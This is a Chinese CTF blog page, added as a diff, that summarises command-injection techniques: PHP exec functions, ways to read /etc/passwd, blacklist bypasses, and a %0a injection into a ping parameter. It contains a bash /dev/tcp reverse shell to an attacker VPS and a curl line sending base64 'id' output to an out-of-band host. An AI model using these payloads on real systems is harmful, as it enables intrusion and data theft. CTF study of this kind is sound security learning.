@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>ctf之命令执行小总结 | Homaebic-Know thyself</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="web,web安全,ctf,安全">
+  
+
+  <meta name="description" content="PHP可以命令执行的函数Exec() System() Passthru() Shell_exec() 读文件的各种各样的方法：常用方法：cat    由第一行开始显示内容，并将所有内容输出 tac    从最后一行倒序显示内容，并将所有内容输出 more   根据窗口大小，一页一页的现实文件内容 less   和more类似，但其优点可以往前翻页，而且进行可以搜索字符 head   只显示头几行">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctf之命令执行小总结">
+<meta property="og:url" content="http://hebic.me/2017/09/26/ctf之命令执行小总结/index.html">
+<meta property="og:site_name" content="Homaebic-Know thyself">
+<meta property="og:description" content="PHP可以命令执行的函数Exec() System() Passthru() Shell_exec() 读文件的各种各样的方法：常用方法：cat    由第一行开始显示内容，并将所有内容输出 tac    从最后一行倒序显示内容，并将所有内容输出 more   根据窗口大小，一页一页的现实文件内容 less   和more类似，但其优点可以往前翻页，而且进行可以搜索字符 head   只显示头几行">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2017-09-26T11:07:24.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ctf之命令执行小总结">
+<meta name="twitter:description" content="PHP可以命令执行的函数Exec() System() Passthru() Shell_exec() 读文件的各种各样的方法：常用方法：cat    由第一行开始显示内容，并将所有内容输出 tac    从最后一行倒序显示内容，并将所有内容输出 more   根据窗口大小，一页一页的现实文件内容 less   和more类似，但其优点可以往前翻页，而且进行可以搜索字符 head   只显示头几行">
+
+  
+
+  
+    <link rel="icon" href="/favicon.ico">
+  
+
+  <link href="/css/styles.css?v=c114cbe6" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/personal-style.css">
+  
+
+  
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  
+  <script type="text/javascript">
+	(function(){
+	    var bp = document.createElement('script');
+	    var curProtocol = window.location.protocol.split(':')[0];
+	    if (curProtocol === 'https') {
+	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+	    }
+	    else {
+	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+	    }
+	    var s = document.getElementsByTagName("script")[0];
+	    s.parentNode.insertBefore(bp, s);
+	})();
+  </script>
+
+
+
+  
+    <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  
+</head>
+</html>
+<body>
+
+
+  
+
+  <div class="post-header">
+   
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP可以命令执行的函数"><span class="toc-text">PHP可以命令执行的函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#读文件的各种各样的方法："><span class="toc-text">读文件的各种各样的方法：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#常用方法："><span class="toc-text">常用方法：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#歪门邪道："><span class="toc-text">歪门邪道：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#命令执行绕过方法："><span class="toc-text">命令执行绕过方法：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#一个题目："><span class="toc-text">一个题目：</span></a></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-ctf之命令执行小总结" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">ctf之命令执行小总结</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2017.09.26</span>
+      </span>
+
+      
+
+      
+
+
+      
+        <span>
+          <i class="icon-comment"></i>
+          <a href="http://hebic.me/2017/09/26/ctf之命令执行小总结/#disqus_thread"></a>
+        </span>
+      
+
+      
+      <i class="fa fa-eye"></i> 
+        <span id="busuanzi_container_page_pv">
+           &nbsp热度 <span id="busuanzi_value_page_pv">
+           <i class="fa fa-spinner fa-spin"></i></span>℃
+        </span>
+      
+
+      
+      
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <h3 id="PHP可以命令执行的函数"><a href="#PHP可以命令执行的函数" class="headerlink" title="PHP可以命令执行的函数"></a>PHP可以命令执行的函数</h3><p><code>Exec()</code></p>
+<p><code>System()</code></p>
+<p><code>Passthru()</code></p>
+<p><code>Shell_exec()</code></p>
+<h3 id="读文件的各种各样的方法："><a href="#读文件的各种各样的方法：" class="headerlink" title="读文件的各种各样的方法："></a>读文件的各种各样的方法：</h3><h4 id="常用方法："><a href="#常用方法：" class="headerlink" title="常用方法："></a>常用方法：</h4><p><code>cat    由第一行开始显示内容，并将所有内容输出</code></p>
+<p><code>tac    从最后一行倒序显示内容，并将所有内容输出</code></p>
+<p><code>more   根据窗口大小，一页一页的现实文件内容</code></p>
+<p><code>less   和more类似，但其优点可以往前翻页，而且进行可以搜索字符</code></p>
+<p><code>head   只显示头几行</code></p>
+<p><code>tail   只显示最后几行</code></p>
+<p><code>nl     类似于cat -n，显示时输出行号</code></p>
+<p><code>tailf  类似于tail -f</code></p>
+<p><code>Vim 使用vim工具打开文本</code></p>
+<p><code>Vi 使用vi打开文本</code></p>
+<h4 id="歪门邪道："><a href="#歪门邪道：" class="headerlink" title="歪门邪道："></a>歪门邪道：</h4><p><code>Curl file:///etc/passwd</code></p>
+<p><code>String/etc/passwd</code></p>
+<p><code>Echo&lt; /etc/passwd</code></p>
+<p><code>Uniq -c/etc/passwd</code></p>
+<p><code>Bash -v /etc/passwd</code></p>
+<p><code>Rev/etc/passwd</code></p>
+<h3 id="命令执行绕过方法："><a href="#命令执行绕过方法：" class="headerlink" title="命令执行绕过方法："></a>命令执行绕过方法：</h3><p>####黑名单：</p>
+<p><code>a=l;b=s;ab</code></p>
+<p><code>a=c;b=at;c=heb;d=ic;ab{c}{d}</code></p>
+<p>####没有回显：</p>
+<p><code>bash -i &gt;&amp; /dev/tcp/xxxxxI(你的vps的公网ip)/8080 0&gt;&amp;1</code></p>
+<p><code>curl whoami.xxxx.xxx(子域名)\</code></p>
+<p><code>Wget、ping</code></p>
+<p><code>curlikyzvu.ceye.io/$(id|base64)</code></p>
+<h3 id="一个题目："><a href="#一个题目：" class="headerlink" title="一个题目："></a>一个题目：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$cmd = shell_exec( <span class="string">'ping  -c 4 '</span> . $target );</span><br></pre></td></tr></table></figure>
+<p>$target可控，又限制的比较死，各种字符都过滤了。使用%0a换行，然后直接执行需要的命令。</p>
+<p>Payload: <a href="http://XXXX:83/index.php?ip=127.0.0.1%0als" target="_blank" rel="noopener">http://XXXX:83/index.php?ip=127.0.0.1%0als</a></p>
+<p>来源：<a href="https://chybeta.github.io/2017/06/18/%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9Dweb-writeup/#WEB-03" target="_blank" rel="noopener">https://chybeta.github.io/2017/06/18/%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9Dweb-writeup/#WEB-03</a></p>
+
+    
+  </div>
+</article>
+
+
+   
+  <div class="text-center donation">
+    <div class="inner-donation">
+      <span class="btn-donation">支持一下</span>
+      <div class="donation-body">
+        <div class="tip text-center">扫一扫，支持forsigner</div>
+        <ul class="theme.donation.items.length">
+        
+          <li class="item">
+            <img src="/images/qr-wechat.png" alt="">
+          </li>
+        
+          <li class="item">
+            <img src="/images/qr-alipay.png" alt="">
+          </li>
+        
+        </ul>
+      </div>
+    </div>
+  </div>
+
+
+   
+  <div class="box-prev-next clearfix">
+    <a class="show pull-left" href="/2017/09/19/四川省大学生信息安全线上VulC0d3 WriteUp/">
+        <i class="icon icon-angle-left"></i>
+    </a>
+    <a class="show pull-right" href="/2017/10/07/一道题目writeup/">
+        <i class="icon icon-angle-right"></i>
+    </a>
+  </div>
+
+
+
+
+</div>
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">关闭</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/archives/" rel="noopener noreferrer" target="_self">
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/category/" rel="noopener noreferrer" target="_self">
+              分类
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/tag/" rel="noopener noreferrer" target="_self">
+              标签
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/link/" rel="noopener noreferrer" target="_self">
+              友链
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/about/" rel="noopener noreferrer" target="_self">
+              关于
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/atom.xml" rel="noopener noreferrer" target="_self">
+              RSS
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/search/" rel="noopener noreferrer" target="_self">
+              搜索
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+  <section class="disqus-comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </div>
+  </section>
+
+  <script>
+    var disqus_shortname = 'forsigner';
+    
+    var disqus_url = 'http://hebic.me/2017/09/26/ctf之命令执行小总结/';
+    
+    (function(){
+      var dsq = document.createElement('script');
+      dsq.type = 'text/javascript';
+      dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+  </script>
+
+  <script id="dsq-count-scr" src="//forsigner.disqus.com/count.js" async></script>
+
+
+
+    
+
+
+
+
+    
+
+    
+	
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
